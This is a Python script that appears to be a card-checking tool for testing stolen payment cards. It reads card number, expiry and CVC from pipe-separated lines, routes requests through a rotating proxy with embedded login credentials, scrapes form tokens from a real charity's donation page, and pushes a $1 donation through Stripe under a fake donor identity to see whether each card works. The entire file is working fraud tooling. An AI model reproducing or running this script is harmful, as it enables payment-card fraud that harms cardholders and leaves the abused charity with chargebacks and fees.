import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'none',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://thefore.org/campaigns/donate/', headers=headers)
	
	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
	campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
	donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51GY9Z7BL0CS8rR8jHCclfYbWANbFqlfRgq7lgJ1hhwg4ehcM3eQqBIRWc7kkloxswKZ8VBSdoRthk0RshUlmJqsk00bWSSgZE6'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Origin': 'https://thefore.org',
	    'Referer': 'https://thefore.org/campaigns/donate/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'charitable_form_id': f'{form_id}',
	    f'{form_id}': '',
	    '_charitable_donation_nonce': f'{donation_nonce}',
	    '_wp_http_referer': '/campaigns/donate/',
	    'campaign_id': f'{campaign_id}',
	    'description': 'The Fore',
	    'ID': f'{donation_id}',
	    'gateway': 'stripe',
	    'donation_amount': 'custom',
	    'custom_donation_amount': '1.00',
	    'title': 'Mr',
	    'first_name': 'Gen',
	    'last_name': 'Paypal',
	    'email': 'genpaypal02@gmail.com',
	    'address': 'Street 27',
	    'postcode': '10080',
	    'where_did_you_hear_about_us': 'twitter',
	    'stripe_payment_method': f'{pm}',
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	response = requests.post('https://thefore.org/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	try:
		scrt = response.json().get('secret')
		if not scrt:
			return response.text
		pi = re.search(r"(pi_[^_]+)", scrt)
		pi = pi.group(1)
	except Exception:
		return response.text	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_51GY9Z7BL0CS8rR8jHCclfYbWANbFqlfRgq7lgJ1hhwg4ehcM3eQqBIRWc7kkloxswKZ8VBSdoRthk0RshUlmJqsk00bWSSgZE6',
	    'client_secret': f'{scrt}',
	}
	
	response = requests.post(
	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
	    headers=headers,
	    data=data,
	)
	
	return response.text
